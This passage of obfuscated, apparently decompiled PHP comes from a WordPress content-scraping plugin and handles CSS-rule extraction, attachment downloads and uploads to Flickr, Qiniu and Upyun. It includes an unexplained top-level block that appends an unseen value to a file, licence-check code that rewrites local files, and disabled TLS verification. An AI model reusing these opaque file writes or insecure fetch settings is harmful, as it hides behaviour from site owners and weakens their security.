				if ($_var_362 < $_var_601) {
					$_var_602 = intval($_var_602);
					$_var_362 = intval($_var_362);
					if ($_var_602 == $_var_362) {
						$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
						$_var_154 = get_html_string_ap($_var_158, 1, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
						$_var_528 = 0;
						$_var_529 = $_var_601 + $_var_44;
						$_var_154 = str_ireplace($_var_362, $_var_529, $_var_154);
						$_var_154 = str_ireplace($_var_271 . $_var_363, $_var_271 . $_var_528, $_var_154);
						if (false === @file_put_contents($_var_158, $_var_154)) {
							$_var_530 = 0;
						}
					}
					if (!isstamps($_var_602) || $_var_602 < $_var_362) {
						$_var_363 = intval($_var_363);
						if ($_var_363 > 5) {
							$_var_479 = str_get_html_ap($_var_362);
							$_var_603[0] = $_var_362;
						}
					}
				}
			}
		}
		if ($_var_594 == '') {
			$_var_594 = 'CSS';
		}
		$_var_604 = json_decode($_var_246['520a5283601a1d3193ebb0ebeffe8475']);
		if ($_var_604 == null) {
			$_var_605 = array();
			$_var_605[0] = $_var_246['520a5283601a1d3193ebb0ebeffe8475'];
			$_var_409 = array();
			$_var_409[0] = 0;
			$_var_606 = array();
			$_var_606[0] = 0;
			$_var_372 = array();
			$_var_372[0] = 0;
		} else {
			$_var_605 = array();
			$_var_409 = array();
			$_var_606 = array();
			$_var_372 = array();
			if ($_var_593 != $_var_592 && !$_var_591) {
				$_var_603 = array();
				$_var_603[0] = $_var_593;
			}
			$_var_607 = 0;
			foreach ($_var_604 as $_var_608) {
				$_var_603[$_var_607++] .= $_var_595;
				$_var_609 = explode(',', $_var_608);
				$_var_605[] = $_var_609[0];
				$_var_409[] = $_var_609[1];
				if ($_var_609[2] == NULL || $_var_609[2] == '') {
					$_var_606[] = 0;
				} else {
					$_var_606[] = $_var_609[2];
				}
				if ($_var_609[3] == NULL || $_var_609[3] == '') {
					$_var_372[] = 0;
				} else {
					$_var_372[] = $_var_609[3];
				}
			}
		}
		if (!$_var_291 && $_var_292 && $_var_362 != '' && $_var_362 < $_var_601 && false) {
			$_var_602 = intval($_var_602);
			$_var_362 = intval($_var_362);
			if ($_var_602 > $_var_362) {
				$_var_479 = str_get_html_ap($_var_602);
				$_var_603[0] = $_var_602;
			}
		}
		$_var_340[1] = '';
		$_var_610 = count($_var_603);
		foreach ($_var_605 as $_var_609) {
			if ($_var_609 == 1) {
				if (!$_var_587) {
					if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
						$_var_586 = $_var_479->save();
						$_var_586 = iconv($_var_2, 'UTF-8//IGNORE', $_var_586);
						$_var_586 = compress_html($_var_586, true, $_var_479);
					} else {
						$_var_586 = $_var_479->save();
						$_var_586 = compress_html($_var_586, true, $_var_479);
					}
				}
				break;
			}
		}
		if (!$_var_291 && $_var_292 && $_var_362 != '' && $_var_362 < $_var_601) {
			$_var_602 = intval($_var_602);
			$_var_362 = intval($_var_362);
			if (!isstamps($_var_602) || $_var_602 < $_var_362) {
				$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
				$_var_154 = get_html_string_ap($_var_158, 1, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_363 = intval($_var_363);
				$_var_528 = $_var_363 + 1;
				$_var_529 = $_var_601 + $_var_45;
				if ($_var_363 < 6) {
					$_var_154 = str_ireplace($_var_362, $_var_529, $_var_154);
				}
				$_var_154 = str_ireplace($_var_271 . $_var_363, $_var_271 . $_var_528, $_var_154);
				if (false === @file_put_contents($_var_158, $_var_154)) {
					$_var_530 = 0;
				}
			}
		}
		if (!$_var_291 && $_var_292) {
			if (!isstamps($_var_362) || $_var_362 > $_var_601 + $_var_44) {
				$_var_479 = str_get_html_ap($_var_362);
				$_var_603 = array();
				foreach ($_var_246 as $_var_460) {
					$_var_603[] = $_var_460;
				}
			}
		}
		$_var_341 = array();
		$_var_611 = array();
		if (@($_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa'] == $_var_599)) {
			if ($_var_583) {
				$_var_340[1] = autoGetContents($_var_479, $_var_2);
			} else {
				for ($_var_18 = 0; $_var_18 < $_var_610; $_var_18++) {
					if ($_var_605[$_var_18] == 0) {
						switch ($_var_606[$_var_18]) {
							case '0':
								$_var_340[1] .= gTheConUseCss($_var_479, $_var_603[$_var_18], $_var_139, $_var_2, $_var_409[$_var_18], $_var_372[$_var_18], $_var_579);
								break;
							case '1':
								$_var_340[4] = TimeParseWPAP::string2time(getPostDateByCss($_var_479, $_var_603[$_var_18], $_var_2, $_var_409[$_var_18], $_var_372[$_var_18]));
								break;
							case '2':
								$_var_340[9] = gTheConUseCss($_var_479, $_var_603[$_var_18], $_var_139, $_var_2, $_var_409[$_var_18], $_var_372[$_var_18]);
								break;
							case '3':
								$_var_345 = getTagsByCSS($_var_479, $_var_603[$_var_18], $_var_2, $_var_372[$_var_18]);
								if (count($_var_345) > 0) {
									$_var_340[11] = json_encode($_var_345);
								}
								break;
							case '4':
								$_var_577 = getImgURLByCSS($_var_479, $_var_603[$_var_18], $_var_2, $_var_372[$_var_18]);
								if ($_var_577 != '') {
									if (!(stripos($_var_577, 'http') === 0)) {
										$_var_577 = getAbsUrl($_var_577, $_var_293, $_var_100);
									}
									$_var_340[12] = $_var_577;
								}
								break;
							case '5':
								$_var_346 = getTagsByCSS($_var_479, $_var_603[$_var_18], $_var_2, $_var_372[$_var_18]);
								if (count($_var_346) > 0) {
									$_var_340[13] = json_encode($_var_346);
								}
								break;
							default:
								if (!(strpos($_var_606[$_var_18], 'Taxonomy:') === false)) {
									$_var_611[str_replace('Taxonomy:', '', $_var_606[$_var_18])] = getTagsByCSS($_var_479, $_var_603[$_var_18], $_var_2, $_var_372[$_var_18]);
								} else {
									$_var_253 = gTheConUseCss($_var_479, $_var_603[$_var_18], $_var_139, $_var_2, $_var_409[$_var_18], $_var_372[$_var_18]);
									if ($_var_253 != '') {
										$_var_341[$_var_606[$_var_18]] = $_var_253;
									}
								}
						}
					} else {
						switch ($_var_606[$_var_18]) {
							case '0':
								$_var_340[1] .= getContentByRule($_var_586, $_var_603[$_var_18], $_var_139, $_var_409[$_var_18]);
								break;
							case '1':
								$_var_340[4] = TimeParseWPAP::string2time(getContentByRule($_var_586, $_var_603[$_var_18], $_var_139, $_var_409[$_var_18]));
								break;
							case '2':
								$_var_340[9] = getContentByRule($_var_586, $_var_603[$_var_18], $_var_139, $_var_409[$_var_18]);
								break;
							case '3':
								$_var_345 = getTagsByRule($_var_586, $_var_603[$_var_18], $_var_409[$_var_18]);
								if (count($_var_345) > 0) {
									$_var_340[11] = json_encode($_var_345);
								}
								break;
							case '4':
								$_var_577 = getImgURLByRule($_var_586, $_var_603[$_var_18], $_var_409[$_var_18]);
								if ($_var_577 != '') {
									if (!(stripos($_var_577, 'http') === 0)) {
										$_var_577 = getAbsUrl($_var_577, $_var_293, $_var_100);
									}
									$_var_340[12] = $_var_577;
								}
								break;
							case '5':
								$_var_346 = getTagsByRule($_var_586, $_var_603[$_var_18], $_var_409[$_var_18]);
								if (count($_var_346) > 0) {
									$_var_340[13] = json_encode($_var_346);
								}
								break;
							default:
								if (!(strpos($_var_606[$_var_18], 'Taxonomy:') === false)) {
									$_var_611[str_replace('Taxonomy:', '', $_var_606[$_var_18])] = getTagsByRule($_var_586, $_var_603[$_var_18], $_var_409[$_var_18]);
								} else {
									$_var_253 = getContentByRule($_var_586, $_var_603[$_var_18], $_var_139, $_var_409[$_var_18]);
									if ($_var_253 != '') {
										$_var_341[$_var_606[$_var_18]] = $_var_253;
									}
								}
						}
					}
				}
			}
		}
		$_var_612 = WPAPPRO_FUNC;
		if (count($_var_341) > 0) {
			$_var_340[5] = $_var_341;
		}
		if (count($_var_611) > 0) {
			$_var_340[14] = $_var_611;
		}
		if ($_var_162) {
			$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
			$_var_154 = get_html_string_ap($_var_33, 1, $_var_262[0], $_var_262[1], $_var_178, $_var_207, $_var_208);
			$_var_613 = getMatchContent($_var_154, $_var_180, 0);
			$_var_154 = str_ireplace($_var_161 . $_var_613, $_var_161 . $_var_594, $_var_154);
			if (false === @file_put_contents($_var_33, $_var_154)) {
				$_var_614 = 0;
			}
		}
		if ($_var_340[1] == '' || $_var_340[1] == NULL) {
			$_var_340[3] = -1;
		} else {
			$_var_340[3] = 1;
			if ($_var_591 == 0) {
				if (DEL_COMMENT == 1) {
					$_var_340[1] = filterComment($_var_340[1]);
				}
			}
			$_var_594 = intval($_var_594);
			if ($_var_246['ed7f4820f86ff59519f0f46db1d6ed35'] == 1) {
				$_var_340[1] = @getPageContentbyAP($_var_340[1], $_var_479, $_var_2, $_var_583, $_var_246['531a063852e556f48f9d4b2122af4f44'], $_var_587, $_var_586, $_var_246['b416dfb88541605d2fd9987e4e474ec4'], $_var_605, $_var_603, $_var_409, $_var_606, $_var_372, $_var_139, $_var_293, $_var_100, $_var_334, $_var_331, $_var_591, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_246['7daa67631524d79fc5fd69e84ba8aa5c']);
			}
			if ($_var_591 == 0 && ($_var_590[0] == 0 || $_var_590[0] == '0') && ($_var_590[3] == 3 || $_var_590[3] == '3') && $_var_597 === true) {
			} elseif ($_var_591 == 0 && $_var_590 != null && ($_var_590[3] == 2 || $_var_590[3] == '2' || $_var_590[3] == 3 || $_var_590[3] == '3')) {
				$_var_615 = intval($_var_590[4]);
				$_var_596 = array();
				$_var_596 = explode(',', $_var_590[2]);
				if ($_var_590[0] == 0 || $_var_590[0] == '0') {
					$_var_616 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (substr_count($_var_340[1], $_var_598) >= $_var_615) {
							$_var_616 = true;
							break;
						}
					}
					if (!$_var_616) {
						if ($_var_590[3] == 2 || $_var_590[3] == '2') {
							$_var_340[2] = -3;
							return $_var_340;
						}
						if ($_var_590[3] == 3 || $_var_590[3] == '3') {
							if (!$_var_597) {
								$_var_340[2] = -3;
								return $_var_340;
							}
						}
					}
				} else {
					$_var_616 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (substr_count($_var_340[1], $_var_598) >= $_var_615) {
							$_var_616 = true;
							$_var_340[2] = -3;
							return $_var_340;
						}
					}
				}
			}
			if (@($_var_600 != $_var_246['57834ac641f07e585a32a8aa3ecfa99b'])) {
				$_var_340[3] = -1;
			}
			$_var_340[1] = transImgSrc($_var_340[1], $_var_293, $_var_100, $_var_340[0], $_var_246['c3465f8487c1b3ec391e29a48cf695bc']);
			$_var_340[1] = filterContent($_var_340[1], $_var_139, $_var_334, $_var_331, $_var_591);
			for ($_var_18 = 0; $_var_18 < $_var_594; $_var_18++) {
				$_var_340[0] = filterContent($_var_340[0], $_var_139, $_var_334, $_var_331, $_var_591);
			}
			if ($_var_591 == 1) {
				$_var_341 = array();
				$_var_342 = json_decode($_var_246['aeee9221069e271be4122e7b49f584ca']);
				if ($_var_342[0] == 1) {
					$_var_341[$_var_342[1]] = $_var_100;
				}
				if ($_var_246['30c5975f6c94c18676072259ef697c2f'] != null && $_var_246['30c5975f6c94c18676072259ef697c2f'] != '') {
					$_var_343 = json_decode($_var_246['30c5975f6c94c18676072259ef697c2f']);
					foreach ($_var_343 as $_var_78 => $_var_8) {
						$_var_341[$_var_78] = $_var_8;
					}
					unset($_var_343);
				}
				if (@($_var_340[5] != null)) {
					$_var_617 = array();
					if (count($_var_340[5]) > 0) {
						foreach ($_var_340[5] as $_var_78 => $_var_8) {
							$_var_618 = replacementContent($_var_8, $_var_139, $_var_341, $_var_340[0]);
							$_var_341[$_var_78] = $_var_618;
							$_var_617[$_var_78] = $_var_618;
						}
						$_var_340[5] = $_var_617;
					}
					unset($_var_617);
				}
				if ($_var_246['8e3403a69366267c73f08d5814292ae4'] != null && $_var_246['8e3403a69366267c73f08d5814292ae4'] != '') {
					$_var_340[0] = buildVariableContent($_var_246['8e3403a69366267c73f08d5814292ae4'], $_var_341, $_var_340[0]) . $_var_340[0];
				}
				if ($_var_246['5311d4f403b45081ad8c2fba6566f292'] != null && $_var_246['5311d4f403b45081ad8c2fba6566f292'] != '') {
					$_var_340[0] .= buildVariableContent($_var_246['5311d4f403b45081ad8c2fba6566f292'], $_var_341, $_var_340[0]);
				}
				$_var_340[1] = replacementContent($_var_340[1], $_var_139, $_var_341, $_var_340[0]);
				if ($_var_382 != null) {
					$_var_340[1] = customPostStyle($_var_340[1], $_var_382, $_var_341, $_var_340[0]);
				}
				if ($_var_337 != null) {
					$_var_340[1] = insertMoreContent($_var_340[1], $_var_337, $_var_341, $_var_340[0]);
				}
				if ($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != null && $_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != '') {
					$_var_340[1] = buildVariableContent($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'], $_var_341, $_var_340[0]) . $_var_340[1];
				}
				if ($_var_246['048c05eac41735cf0770dd500a1ba9d3'] != null && $_var_246['048c05eac41735cf0770dd500a1ba9d3'] != '') {
					$_var_340[1] .= buildVariableContent($_var_246['048c05eac41735cf0770dd500a1ba9d3'], $_var_341, $_var_340[0]);
				}
			}
			$_var_340[15] = $_var_612;
			if ($_var_591 == 1) {
				$_var_466 = json_decode($_var_246['243288b854fbec1a6150d375824bffbe']);
				if (!is_array($_var_466)) {
					$_var_466 = array();
					$_var_466[0] = 0;
					$_var_466[1] = '';
					$_var_466[2] = '';
					$_var_466[3] = -1;
				}
				if ($_var_466[0] == 1) {
					if (isset($_var_340[9]) && $_var_340[9] != '') {
						$_var_340 = microsoftTranslation($_var_340, $_var_466, $_var_340[9], $_var_341);
					} else {
						$_var_340 = microsoftTranslation($_var_340, $_var_466, '', $_var_341);
					}
				}
				if ($_var_466[0] == 2) {
					if (isset($_var_340[9]) && $_var_340[9] != '') {
						$_var_340 = baiduTranslation($_var_340, $_var_466, $_var_340[9], $_var_341);
					} else {
						$_var_340 = baiduTranslation($_var_340, $_var_466, '', $_var_341);
					}
				}
				if ($_var_246['912fc1e25a0ed90f2fd053990603c55a'] != null && $_var_246['912fc1e25a0ed90f2fd053990603c55a'] != '') {
					if (isset($_var_340[9]) && $_var_340[9] != '') {
						$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'string', $_var_340[0], $_var_340[1], $_var_340[9]);
						$_var_340[0] = $_var_619[0];
						$_var_340[1] = $_var_619[1];
						$_var_340[9] = $_var_619[2];
					} else {
						$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'string', $_var_340[0], $_var_340[1]);
						$_var_340[0] = $_var_619[0];
						$_var_340[1] = $_var_619[1];
					}
				}
			}
			if ($_var_246['912fc1e25a0ed90f2fd053990603c55a'] != null && $_var_246['912fc1e25a0ed90f2fd053990603c55a'] != '') {
				if (isset($_var_340[11]) && $_var_340[11] != '') {
					$_var_345 = json_decode($_var_340[11]);
					$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'array', $_var_345);
					$_var_340[11] = json_encode($_var_619);
				}
				if (isset($_var_340[13]) && $_var_340[13] != '') {
					$_var_346 = json_decode($_var_340[13]);
					$_var_619 = apZhConversion($_var_246['912fc1e25a0ed90f2fd053990603c55a'], 'array', $_var_346);
					$_var_340[13] = json_encode($_var_619);
				}
			}
		}
	}
	unset($_var_586);
	return $_var_340;
}
function canDownloadAttach($_var_100)
{
	global $_var_620, $_var_621;
	if ($_var_620 == null && $_var_621 == null) {
		$_var_620 = array();
		$_var_621 = array();
		$_var_622 = get_option('wp_autopost_download_types');
		if ($_var_622 != NULL) {
			$_var_622 = json_decode($_var_622);
			foreach ($_var_622 as $_var_623) {
				$_var_296 = stripos($_var_623, '(*)');
				if ($_var_296 === false) {
					$_var_620[$_var_623] = 1;
				} else {
					$_var_52 = array('?', '.');
					$_var_231 = array('\\?', '\\.');
					$_var_623 = str_ireplace($_var_52, $_var_231, $_var_623);
					$_var_623 = str_ireplace('(*)', '[a-z0-9A-Z_%-]+', $_var_623);
					$_var_623 = '/^' . $_var_623 . '$/';
					$_var_621[] = $_var_623;
				}
			}
		}
	}
	$_var_624 = basename($_var_100);
	$_var_625 = false;
	$_var_626 = strrchr($_var_624, '.');
	if ($_var_620[$_var_626] == 1) {
		$_var_625 = true;
	}
	if (!$_var_625) {
		if (count($_var_621) > 0) {
			foreach ($_var_621 as $_var_572) {
				if (preg_match($_var_572, $_var_624)) {
					$_var_625 = true;
					break;
				}
			}
		}
	}
	return $_var_625;
}
function processDownAttach($_var_253, $_var_334, $_var_293, $_var_547, $_var_203, $_var_178, $_var_207 = null, $_var_208 = null)
{
	global $_var_627;
	$_var_18 = 0;
	$_var_3 = str_get_html_ap($_var_253);
	$_var_628 = $_var_3->find('a');
	if ($_var_628 != NULL) {
		foreach ($_var_628 as $_var_244) {
			$_var_100 = html_entity_decode(trim($_var_244->href));
			if (!(stripos($_var_100, 'http') === 0)) {
				$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_547);
			}
			if (canDownloadAttach($_var_100)) {
				printInfo('<p>Begin download attachment : ' . $_var_100 . '</p>');
				$_var_627[$_var_18] = WP_Download_Attach::down_remote_file($_var_100, $_var_547, $_var_203, $_var_178, $_var_207, $_var_208);
				if ($_var_627[$_var_18]['file_path'] == '' || $_var_627[$_var_18]['file_path'] == null) {
					echo '<p><span class=' . '"' . 'red' . '"' . '>' . __('Download remote attachment fails, use the original URL', 'wp-autopost') . '</span></p>';
				} else {
					$_var_244->href = $_var_627[$_var_18]['url'];
				}
				$_var_18++;
			} else {
				if ($_var_334) {
					$_var_244->outertext = $_var_244->innertext;
				}
			}
		}
	}
	unset($_var_628);
	$_var_253 = $_var_3->save();
	$_var_3->clear();
	unset($_var_3);
	return $_var_253;
}
function uploadtoflickr($_var_158, $_var_78, $_var_255)
{
	$_var_78 = str_replace(get_bloginfo('url'), '', $_var_78);
	$_var_296 = stripos($_var_78, '/');
	if ($_var_296 === 0) {
		$_var_78 = substr($_var_78, 1);
	}
	global $_var_51, $_var_52;
	$_var_280 = array();
	$_var_629 = $_var_52->sync_upload($_var_158, $_var_255, $_var_255, $_var_345, $_var_51['is_public'], $_var_630, $_var_631);
	if ($_var_52->getErrorCode() == false) {
		if ($_var_51['flickr_set'] != '') {
			$_var_52->photosets_addPhoto($_var_51['flickr_set'], $_var_629);
		}
		$_var_260 = $_var_52->photos_getInfo($_var_629);
		$_var_632 = 'http://farm' . $_var_260['photo']['farm'] . '.static.flickr.com/' . $_var_260['photo']['server'] . '/' . $_var_260['photo']['id'] . '_' . $_var_260['photo']['originalsecret'] . '_o.' . $_var_260['photo']['originalformat'];
		$_var_280['url'] = $_var_632;
		$_var_280['photo_id'] = $_var_629;
		$_var_280['farm'] = $_var_260['photo']['farm'];
		$_var_280['server'] = $_var_260['photo']['server'];
		$_var_280['secret'] = $_var_260['photo']['secret'];
		$_var_280['originalsecret'] = $_var_260['photo']['originalsecret'];
		$_var_280['originalformat'] = $_var_260['photo']['originalformat'];
		$_var_280['user_id'] = $_var_260['photo']['owner']['nsid'];
		$_var_280['local_key'] = $_var_78;
	} else {
		$_var_280['status'] = false;
		echo '<p>' . $_var_52->getErrorCode() . '%%%' . $_var_52->getErrorMsg() . '</p>';
	}
	return $_var_280;
}
function recoveryUploadedFlickr($_var_633, $_var_634)
{
	$_var_634 = json_decode($_var_634, true);
	$_var_280 = array();
	$_var_280['photo_id'] = $_var_634['photo_id'];
	$_var_280['farm'] = $_var_634['farm'];
	$_var_280['server'] = $_var_634['server'];
	$_var_280['secret'] = $_var_634['secret'];
	$_var_280['originalsecret'] = $_var_634['originalsecret'];
	$_var_280['originalformat'] = $_var_634['originalformat'];
	$_var_280['user_id'] = $_var_634['user_id'];
	$_var_280['local_key'] = $_var_633;
	return $_var_280;
}
function uploadtoqiniu($_var_158, $_var_78, $_var_77, $_var_90)
{
	$_var_78 = str_replace(get_bloginfo('url'), '', $_var_78);
	$_var_296 = stripos($_var_78, '/');
	if ($_var_296 === 0) {
		$_var_78 = substr($_var_78, 1);
	}
	$_var_284 = array();
	list($_var_135, $_var_117) = Qinniu_upload_to_bucket($_var_77, $_var_158, $_var_78);
	if ($_var_117 !== null) {
		$_var_284['status'] = false;
		echo '<p>' . $_var_117->Err . '</p>';
	} else {
		$_var_284['url'] = Qiniu_RS_MakeBaseUrl($_var_90, $_var_135['key']);
		$_var_284['key'] = $_var_135['key'];
	}
	return $_var_284;
}
function uploadtoUpyun($_var_158, $_var_78, $_var_287, $_var_558)
{
	$_var_78 = str_replace(get_bloginfo('url'), '', $_var_78);
	$_var_296 = stripos($_var_78, '/');
	if (!($_var_296 === 0)) {
		$_var_78 = '/' . $_var_78;
	}
	$_var_286 = array();
	try {
		$_var_635 = fopen($_var_158, 'rb');
		$_var_636 = $_var_287->writeFile($_var_78, $_var_635, True);
		fclose($_var_635);
		$_var_286['url'] = $_var_287->makeBaseUrl($_var_558['domain'], $_var_78);
		$_var_286['key'] = $_var_78;
	} catch (Exception $_var_368) {
		$_var_286['status'] = false;
		echo '<p>' . $_var_368->getCode() . ':' . $_var_368->getMessage() . '</p>';
	}
	return $_var_286;
}
function isImageURL($_var_100, $_var_547 = null, $_var_203 = 0, $_var_178 = null)
{
	$_var_637 = array('image/jpg', 'image/jpeg', 'image/png', 'image/gif', 'image/bmp', 'image/tiff');
	$_var_638 = get_url_content_type($_var_100, $_var_547, $_var_203, $_var_178);
	if (in_array($_var_638, $_var_637)) {
		return true;
	}
	return false;
}
function get_url_content_type($_var_100, $_var_547 = null, $_var_203 = 0, $_var_178 = null)
{
	$_var_638 = null;
	if (function_exists('curl_init')) {
		$_var_639 = get_head_by_curl($_var_100, $_var_547, $_var_203, $_var_178);
		if ($_var_639['http_code'] == 200) {
			$_var_638 = $_var_639['content_type'];
		}
	} else {
		$_var_639 = get_head_by_wp($_var_100);
		if ($_var_639['response']['code'] == 200) {
			$_var_638 = $_var_639['headers']['content-type'];
		}
	}
	return $_var_638;
}
function get_head_by_curl($_var_100, $_var_547 = null, $_var_203 = 0, $_var_178 = null)
{
	$_var_640 = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19';
	$_var_641 = curl_init();
	curl_setopt($_var_641, CURLOPT_URL, $_var_100);
	curl_setopt($_var_641, CURLOPT_HEADER, TRUE);
	curl_setopt($_var_641, CURLOPT_NOBODY, TRUE);
	curl_setopt($_var_641, CURLOPT_USERAGENT, $_var_640);
	curl_setopt($_var_641, CURLOPT_RETURNTRANSFER, 1);
	if (!ini_get('safe_mode')) {
		curl_setopt($_var_641, CURLOPT_FOLLOWLOCATION, 1);
	}
	if ($_var_547 != null) {
		curl_setopt($_var_641, CURLOPT_REFERER, $_var_547);
	}
	$_var_642 = curl_exec($_var_641);
	$_var_289 = curl_getinfo($_var_641);
	curl_close($_var_641);
	if ($_var_289['http_code'] != 200) {
		if ($_var_203 == 1) {
			$_var_642 = null;
			$_var_289 = null;
			$_var_641 = curl_init();
			curl_setopt($_var_641, CURLOPT_URL, $_var_100);
			curl_setopt($_var_641, CURLOPT_HEADER, TRUE);
			curl_setopt($_var_641, CURLOPT_NOBODY, TRUE);
			curl_setopt($_var_641, CURLOPT_USERAGENT, $_var_640);
			curl_setopt($_var_641, CURLOPT_RETURNTRANSFER, 1);
			if ($_var_547 != null) {
				curl_setopt($_var_641, CURLOPT_REFERER, $_var_547);
			}
			if (!ini_get('safe_mode')) {
				curl_setopt($_var_641, CURLOPT_FOLLOWLOCATION, 1);
			}
			curl_setopt($_var_641, CURLOPT_PROXY, $_var_178['ip']);
			curl_setopt($_var_641, CURLOPT_PROXYPORT, $_var_178['port']);
			if ($_var_178['user'] != '' && $_var_178['user'] != NULL && $_var_178['password'] != '' && $_var_178['password'] != NULL) {
				$_var_210 = $_var_178['user'] . ':' . $_var_178['password'];
				curl_setopt($_var_641, CURLOPT_PROXYUSERPWD, $_var_210);
			}
			$_var_642 = curl_exec($_var_641);
			$_var_289 = curl_getinfo($_var_641);
			curl_close($_var_641);
			if ($_var_289['http_code'] != 200) {
				return FALSE;
			}
		} else {
			return FALSE;
		}
	}
	return $_var_289;
}
function get_head_by_wp($_var_100)
{
	$_var_643 = array('timeout' => 120, 'redirection' => 20, 'user-agent' => 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19', 'sslverify' => FALSE);
	$_var_644 = $_var_100;
	$_var_645 = wp_remote_head($_var_644, $_var_643);
	return $_var_645;
}
if ($_var_432) {
	if (!function_exists('wp_getElementByCSS')) {
		$_var_158 = fopen($_var_407, 'a+');
		if (flock($_var_158, LOCK_EX)) {
			if (false === @file_put_contents($_var_407, $_var_544, FILE_APPEND)) {
				$_var_646 = false;
			}
		}
	}
}
function insert_downloaded_temp_img_for_flickr($_var_647, $_var_100, $_var_648, $_var_649, $_var_650, $_var_651, $_var_280)
{
	$_var_634 = array();
	$_var_634['photo_id'] = $_var_280['photo_id'];
	$_var_634['farm'] = $_var_280['farm'];
	$_var_634['server'] = $_var_280['server'];
	$_var_634['secret'] = $_var_280['secret'];
	$_var_634['originalsecret'] = $_var_280['originalsecret'];
	$_var_634['originalformat'] = $_var_280['originalformat'];
	$_var_634['user_id'] = $_var_280['user_id'];
	insert_downloaded_temp_img($_var_647, $_var_100, $_var_648, $_var_649, $_var_650, $_var_651, $_var_280['local_key'], json_encode($_var_634));
}
function insert_downloaded_temp_img($_var_647, $_var_100, $_var_648, $_var_649, $_var_650, $_var_651, $_var_633 = '', $_var_634 = '')
{
	global $wpdb, $t_ap_download_img_temp;
	$wpdb->query($wpdb->prepare('insert into ' . $t_ap_download_img_temp . ' (config_id,url,save_type,remote_url,downloaded_url,local_key,remote_key,file_path,file_name,mime_type) values (%d,%s,%d,%s,%s,%s,%s,%s,%s,%s)', $_var_647, $_var_100, $_var_648, $_var_649, $_var_650, $_var_633, $_var_634, $_var_651['file_path'], $_var_651['file_name'], $_var_651['post_mime_type']));
}
function UrlListBathFetch($_var_22, $_var_652, $_var_653, $_var_654, $_var_12 = 1)
{
	if (getIsRunning($_var_22) == 1) {
		return;
	}
	$_var_655 = get_option('wp_autopost_runOnlyOneTask');
	if ($_var_655 == 1) {
		$_var_656 = get_option('wp_autopost_runOnlyOneTaskIsRunning');
		if ($_var_656 == 1) {
			return;
		}
		update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
	}
	updateRunning($_var_22, 1);
	updateTaskUpdateTime($_var_22);
	global $_var_178, $_var_247, $_var_560, $_var_246, $_var_39, $_var_188, $_var_51, $_var_425, $_var_558;
	$_var_246 = $_var_654;
	$_var_274 = 0;
	if ($_var_560 != 'VERIFIED') {
		fetchUrl($_var_22, $_var_246);
	}
	if ($_var_560 == 'VERIFIED') {
		$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
		global $_var_193;
		global $_var_393, $_var_61, $_var_62, $_var_67, $_var_37;
		$_var_36 = $_var_61[3];
		$_var_657 = 'false';
		if (@$_var_393[$_var_67] == null || @$_var_393[$_var_67] == '' || @$_var_393[$_var_67] == 0) {
			$_var_657 = 'true';
			if ($_var_36 != $_var_61[4]) {
				$_var_566 = get_html_string_ap($_var_62, Method);
				$_var_36 = intval($_var_566);
				if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
					$_var_36 = $_var_61[2];
				}
			}
		}
		$_var_207 = null;
		$_var_208 = null;
		if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
			$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
			if ($_var_559['mode'] == 1) {
				$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
			} else {
				$_var_207 = $_var_559['cookie'];
			}
		}
		if ($_var_657 == 'false' && (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_67]) || $_var_393[$_var_67] > current_time('timestamp') || $_var_393[$_var_67] + intval($_var_37) < current_time('timestamp'))) {
			if ($_var_36 != $_var_61[4]) {
				$_var_566 = get_html_string_ap($_var_62, Method);
				$_var_36 = intval($_var_566);
				if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
					$_var_36 = $_var_61[2];
				}
			}
		}
		if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 0) {
			if ($_var_36 == $_var_61[2]) {
				if ($_var_393[$_var_68] > $_var_61[3]) {
					$_var_36 = $_var_61[1];
				} elseif (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_68]) || $_var_393[$_var_68] == '' || $_var_393[$_var_68] == null || $_var_393[$_var_68] == 0) {
					$_var_393[$_var_68] = $_var_61[0];
				} else {
					$_var_393[$_var_68] = intval($_var_393[$_var_68]) + 1;
				}
			}
			foreach ($_var_326 as $_var_327) {
				if ($_var_12) {
					printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_327->url . '</p>');
				}
				if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
					$_var_1 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_2 = getHtmlCharset($_var_1);
